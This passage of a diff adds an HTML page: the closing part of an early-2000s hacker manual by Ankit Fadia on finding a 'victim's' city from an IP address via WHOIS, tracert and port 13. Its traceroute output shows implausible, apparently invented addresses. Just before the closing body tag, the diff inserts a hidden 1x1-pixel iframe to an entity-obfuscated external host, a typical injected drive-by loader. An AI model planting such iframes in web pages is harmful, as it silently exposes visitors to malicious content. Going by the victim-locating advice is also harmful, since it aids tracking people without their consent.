+    domain name (which is registered on his name) or have to remain satisfied 
+    knowing only the city (and ISP) used by the person. </font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">Say, 
+    the victim has registered a domain name and you want to use it to find out 
+    the city in which he resides. Now, one thing to remember in this case is that, 
+    if the victim has registered the domain name using any of the various free 
+    .com registration services like Namezero.com etc, then the domain name would 
+    probably be registered on the company’s name and not the victim’s name. So, 
+    a WHOIS query will give information on the ISP and not the victim.</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Verdana, Arial, Helvetica, sans-serif" size="2">*****************</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><b><font color="#FFFFFF">NEWBIE 
+    NOTE: </font></b>The WHOIS service by default runs on Port 43 of a system. 
+    Try performing a WHOIS query by telnetting to Port 43 and manually typing 
+    out the query. I have never tried it, however, it might be fun. </font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Verdana, Arial, Helvetica, sans-serif" size="2">***************</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">Yet 
+    another and probably the second most efficient method (after Reverse DNS queries) 
+    of tracing an IP to its exact geographical location, is to carry out a ‘traceroute’ 
+    on it. The ‘tracert’ or ‘traceroute’ commands give you the names or IP’s of 
+    the routers through which it passes, before reaching the destination. Windows 
+    users can perform a trace of an IP, by typing the following at the command 
+    line prompt:</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">C:\windows&gt;tracert 
+    IP or Hostname</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">For 
+    more information about the usage and syntax of this command, type: ‘tracert’ 
+    at the command prompt. </font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">Anyway, 
+    now let us see what is the result, when I do a tracert on my IP. Remember 
+    I live in New Delhi which is a city in India. Watch the names of the hostnames 
+    closely, as you will find that they reveal the cities through which the packet 
+    passes.</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">C:\windows&gt;tracert 
+    203.94.12.54</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">Tracing 
+    route to 203.94.12.54 over a maximum of 30 hops</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><span
+style="mso-spacerun: yes">   </span></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">1 
+    abc.netzero.com (232.61.41.251) 2 ms 1 ms 1 ms<span style="mso-spacerun: yes">  
+    </span></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">2<span
+style="mso-spacerun: yes">  </span>xyz.Netzero.com (232.61.41.0) 5 ms 5 ms 5 ms<span style="mso-spacerun: yes">  
+    </span></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">3 
+    232.61.41.10 (232.61.41.251)<span style="mso-spacerun: yes">  </span>9 ms 
+    11 ms 13 ms<span style="mso-spacerun: yes">  </span></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">4 
+    we21.spectranet.com (196.01.83.12) 535 ms 549 ms 513 ms<span
+style="mso-spacerun: yes">  </span></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">5 
+    isp.net.ny (196.23.0.0) 562 ms 596 ms 600 ms<span style="mso-spacerun: yes">  
+    </span></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">6 
+    196.23.0.25 (196.23.0.25)<span style="mso-spacerun: yes">  </span>1195 ms1204 
+    ms<span style="mso-spacerun: yes">  </span></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">7 
+    backbone.isp.ny (198.87.12.11) 1208 ms1216 ms1233 ms </font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">8<span
+style="mso-spacerun: yes">  </span>asianet.com (202.12.32.10)<span
+style="mso-spacerun: yes">  </span>1210 ms1239 ms1211 ms<span
+style="mso-spacerun: yes">  </span></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">9<span
+style="mso-spacerun: yes">  </span>south.asinet.com (202.10.10.10) 1069 ms1087 
+    ms1122 ms<span style="mso-spacerun: yes">  </span></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">10 
+    backbone.vsnl.net.in<span style="mso-spacerun: yes">  </span>(203.98.46.01) 
+    1064 ms1109 ms1061 ms<span style="mso-spacerun: yes">  </span></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">11 
+    newdelhi-01.backbone.vsnl.net.in (203.102.46.01) 1185 ms1146 ms1203 ms<span
+style="mso-spacerun: yes">  </span></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">12 
+    newdelhi-00.backbone.vsnl.net.in (203.102.46.02) ms1159 ms1073 ms<span
+style="mso-spacerun: yes">  </span></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">13 
+    mtnl.net.in (203.194.56.00)<span style="mso-spacerun: yes">  </span>1052 ms 
+    642 ms 658 ms<span style="mso-spacerun: yes">  </span></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">So, 
+    the above shows us that the route taken by a data to reach the supplied IP 
+    is somewhat like this:</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">Netzero 
+    (ISP from which the data is sent) ---&gt;<span style='font-family:Wingdings;
+mso-ascii-font-family:"Times New Roman";mso-hansi-font-family:"Times New Roman";
+mso-char-type:symbol;mso-symbol-font-family:Wingdings'></span> Spectranet (A Backbone 
+    Provider) -----&gt; New York ISP ---&gt; New York Backbone -&gt; Asia --&gt; 
+    South Asia -&gt; India Backbone --&gt; New Delhi Backbone --&gt; Another router 
+    in New Delhi Backbone ---&gt; New Delhi ISP.</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">So, 
+    basically this tracert does reveal my real location, which is: New Delhi, 
+    India, South Asia. Get it?</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">Sometimes, 
+    doing a ‘tracert’ on an IP, does not give useful information. You see in the 
+    above example, the hostnames returned revealed the city or country in which 
+    the system is located. Although, more often than not, you will get such helpful 
+    hostnames, sometimes the hostnames returned are very vague and unhelpful.</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">So 
+    what do you do then? Well, fret not. Simply do the below procedure.</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">Let 
+    us say that the trace ends at the hostname abc.com. This is very vague and 
+    gives absolutely no clue as to where the system is located. However, what 
+    you could do is, launch your browser and visit: <a href="http://www.abc.com/">http://www.abc.com</a> 
+    Now, abc.com is probably an ISP and an ISP, will definitely give its location 
+    and the cities in which it operates. So, you could still have a good chance 
+    of learning the definite city of the victim.</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">A 
+    very interesting utility is the VisualRoute utility, (<a
+href="http://www.visualroute.com/">http://www.visualroute.com</a>) which traces 
+    a hostname or IP and shows the path taken by the packet to reach the destination 
+    on a world map. It is very useful and reveals some excellent information. 
+    However, it sometimes does tend to be inaccurate. </font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Verdana, Arial, Helvetica, sans-serif" size="2">**********************</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2" color="#FFFFFF"><b>HACKING 
+    TRUTH:</b></font><font face="Arial, Helvetica, sans-serif" size="2"> Say you 
+    have found out the ISP of a person and simply want to learn as to in which 
+    country the person resides in. However, visiting the ISP website doesn’t help. 
+    Nor does the hostname help. So, what do you do? Well, one thing that you could 
+    do is, try connecting to Port 13 of the ISP. This is the port, which simply 
+    displays the system time. It will tell you how many hours ahead or behind 
+    the system is from GMT time. </font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Verdana, Arial, Helvetica, sans-serif" size="2">**********************</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">Well, 
+    this basically brings us to the end of this manual. Before I sign off, I would 
+    like to make it clear that it extremely difficult and surprising if someone 
+    is able to get the exact contact address of a person by simply knowing his 
+    IP. (Without taking help or breaking into the person’s ISP) Anyway, hope you 
+    liked this manual. Goodbye.</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">Ankit 
+    Fadia</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><a
+href="mailto:ankit@bol.net.in">ankit@bol.net.in</a></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">For 
+    more of his work visit: <a href="http://hackingtruths.box.sk/">http://hackingtruths.box.sk</a> 
+    </font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">To 
+    receive manuals on EVERYTHING YOU DREAMT OF Written by Ankit Fadia in your 
+    Inbox, join his mailing list, by sending a blank email to: <a
+href="mailto:programmingforhackers-subscribe@egroups.com">programmingforhackers-subscribe@egroups.com</a></font></p>
+</div>
+
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+
+</html>
